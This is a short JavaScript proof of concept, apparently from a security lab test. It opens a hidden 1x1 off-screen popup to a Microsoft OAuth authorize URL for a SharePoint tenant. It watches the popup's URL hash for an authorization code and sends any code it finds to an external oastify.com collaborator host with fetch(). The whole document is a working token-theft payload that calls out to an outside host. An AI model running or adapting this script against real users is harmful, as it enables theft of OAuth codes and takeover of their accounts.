(async()=>{
if(window.__labPoc)return;
window.__labPoc=1;

const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=form%5Fpost&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=19D5FC3344AC90670EA85AD83C18D536E46137EA4EEE76EA%2DA1E4AFA0C47D9C81F7714D74BB8A97C46713F47F8AE52EDE3443B119F482F88B&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=3014e2a1%2Db036%2Db000%2D0f8f%2D867261f0d3b8";

let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");

for(let i=0;i<80;i++){
 try{
  let hash=win.location.hash;
  if(hash&&hash.includes("code=")){
   fetch("https://nh81fp0ydg1pns9kulz74shlwc23qtei.oastify.com/?x="+encodeURIComponent(hash));
   win.close();
   break;
  }
 }catch(e){}
 await new Promise(r=>setTimeout(r,300));
}
})();
